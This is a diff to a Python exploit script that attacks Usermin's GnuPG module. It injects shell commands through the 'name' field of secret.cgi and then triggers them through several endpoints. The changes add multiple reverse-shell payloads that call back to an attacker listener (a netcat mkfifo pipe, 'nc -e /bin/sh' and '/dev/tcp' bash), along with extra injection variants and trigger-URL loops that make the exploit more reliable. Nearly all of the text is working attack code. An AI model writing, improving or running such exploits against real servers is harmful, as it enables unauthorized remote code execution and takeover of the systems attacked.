@@ -117,50 +117,64 @@ class UserminRCE:
 
     def generate_payload(self):
         """Generate reverse shell payload with fallback options"""
-        # Primary payload using netcat
+        # Primary payload using netcat (original format)
         primary_payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {self.listener_ip} {self.listener_port} > /tmp/f"
+        
+        # Alternative netcat payload
+        alt_netcat_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/sh"
         
         # Fallback payload using bash
         fallback_payload = f"bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1"
         
-        return primary_payload, fallback_payload
+        # Simple test payload
+        test_payload = f"nc {self.listener_ip} {self.listener_port} -e /bin/bash"
+        
+        return primary_payload, alt_netcat_payload, fallback_payload, test_payload
 
     def submit_payload(self, payload):
         """Submit the payload via GnuPG secret creation"""
         print(f"[+] Submitting payload to {self.listener_ip}:{self.listener_port}")
+        print(f"[+] Payload: {payload}")
         
         secret_url = urljoin(self.base_url, "/gnupg/secret.cgi")
-        payload_data = {
-            "name": f'";{payload}echo "',
-            "email": "1337@webmin.com",
-        }
+        
+        # Try different payload formats
+        payload_formats = [
+            {"name": f'";{payload}echo "', "email": "1337@webmin.com"},
+            {"name": f'";{payload};echo "', "email": "1337@webmin.com"},
+            {"name": f'";{payload} #', "email": "1337@webmin.com"},
+            {"name": f'";{payload}"', "email": "1337@webmin.com"},
+        ]
         
         headers = {'Referer': self.base_url}
         
-        try:
-            response = self.session.post(
-                secret_url, 
-                data=payload_data, 
-                headers=headers, 
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                if "successfully" in response.text.lower():
-                    print("[+] Payload submitted successfully")
-                    return True
-                else:
-                    print("[-] Payload submission failed - no success message found")
-                    if "error" in response.text.lower():
-                        print("[*] Response contains error message")
-                    return False
-            else:
-                print(f"[-] Payload submission failed with status code: {response.status_code}")
-                return False
+        for i, payload_data in enumerate(payload_formats):
+            try:
+                print(f"[*] Trying payload format {i+1}...")
+                response = self.session.post(
+                    secret_url, 
+                    data=payload_data, 
+                    headers=headers, 
+                    timeout=15
+                )
                 
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Payload submission failed: {e}")
-            return False
+                if response.status_code == 200:
+                    if "successfully" in response.text.lower():
+                        print(f"[+] Payload submitted successfully with format {i+1}")
+                        return True
+                    else:
+                        print(f"[-] Format {i+1} failed - no success message")
+                        if "error" in response.text.lower():
+                            print("[*] Response contains error message")
+                else:
+                    print(f"[-] Format {i+1} failed with status code: {response.status_code}")
+                    
+            except requests.exceptions.RequestException as e:
+                print(f"[-] Format {i+1} failed: {e}")
+                continue
+        
+        print("[-] All payload formats failed")
+        return False
 
     def get_key_id(self):
         """Extract the key ID from the GnuPG key list"""
@@ -262,15 +276,29 @@ class UserminRCE:
         if not self.login():
             return False
         
-        # Generate payload
-        primary_payload, fallback_payload = self.generate_payload()
+        # Generate payloads
+        primary_payload, alt_netcat_payload, fallback_payload, test_payload = self.generate_payload()
         
-        # Submit primary payload
-        if not self.submit_payload(primary_payload):
-            print("[!] Primary payload failed, trying fallback...")
-            if not self.submit_payload(fallback_payload):
-                print("[-] Both payloads failed")
-                return False
+        # Try different payloads
+        payloads = [
+            ("Primary netcat", primary_payload),
+            ("Alternative netcat", alt_netcat_payload),
+            ("Bash fallback", fallback_payload),
+            ("Simple test", test_payload)
+        ]
+        
+        payload_submitted = False
+        for name, payload in payloads:
+            print(f"\n[+] Trying {name} payload...")
+            if self.submit_payload(payload):
+                payload_submitted = True
+                break
+            else:
+                print(f"[-] {name} payload failed")
+        
+        if not payload_submitted:
+            print("[-] All payloads failed")
+            return False
         
         # Get key ID
         key_id = self.get_key_id()
@@ -284,24 +312,35 @@ class UserminRCE:
             else:
                 print("[-] Failed to trigger payload with key ID")
         
-        # Fallback: try to trigger without key ID (original method)
-        print("[!] Trying fallback method without key ID...")
-        try:
-            # Try to access the list_keys page which might trigger the payload
-            list_keys_url = urljoin(self.base_url, "/gnupg/list_keys.cgi")
-            response = self.session.post(list_keys_url, timeout=3)
-            print("[+] Fallback trigger attempted")
-            print("[+] Check your listener for reverse shell")
-            return True
-        except requests.exceptions.ReadTimeout:
-            print("[+] Fallback trigger timeout - reverse shell should be incoming!")
-            return True
-        except requests.exceptions.ConnectionError:
-            print("[+] Fallback trigger connection closed - reverse shell likely established")
-            return True
-        except Exception as e:
-            print(f"[-] Fallback trigger failed: {e}")
-            return False
+        # Fallback: try multiple trigger methods
+        print("[!] Trying multiple fallback trigger methods...")
+        
+        trigger_urls = [
+            "/gnupg/list_keys.cgi",
+            "/gnupg/secret.cgi",
+            "/gnupg/index.cgi",
+            "/gnupg/",
+        ]
+        
+        for url in trigger_urls:
+            try:
+                print(f"[*] Trying trigger: {url}")
+                trigger_url = urljoin(self.base_url, url)
+                response = self.session.post(trigger_url, timeout=3)
+                print(f"[+] Trigger {url} completed")
+            except requests.exceptions.ReadTimeout:
+                print(f"[+] Trigger {url} timeout - reverse shell should be incoming!")
+                return True
+            except requests.exceptions.ConnectionError:
+                print(f"[+] Trigger {url} connection closed - reverse shell likely established")
+                return True
+            except Exception as e:
+                print(f"[-] Trigger {url} failed: {e}")
+                continue
+        
+        print("[+] All trigger methods attempted")
+        print("[+] Check your listener for reverse shell")
+        return True
 
 def main():
     parser = argparse.ArgumentParser(
